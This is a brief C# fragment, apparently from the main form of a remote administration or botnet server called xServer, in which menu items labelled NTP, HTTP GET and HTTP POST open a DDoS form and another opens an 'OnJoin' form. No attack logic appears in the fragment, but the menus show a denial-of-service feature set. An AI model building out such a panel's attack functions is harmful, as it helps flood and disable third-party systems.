...
namespace xServer.Forms
{
    public partial class FrmMain : Form
    {
        ...
        private void nTPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var frm = new FrmDDoS();
            frm.Show();
        }

        private void hTTPGETToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var frm = new FrmDDoS();
            frm.Show();
        }

        private void hTTPPOSTToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var frm = new FrmDDoS();
            frm.Show();
        }

        private void onJoinToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var frm = new FrmOnJoin();
            frm.Show();
        }
    }
}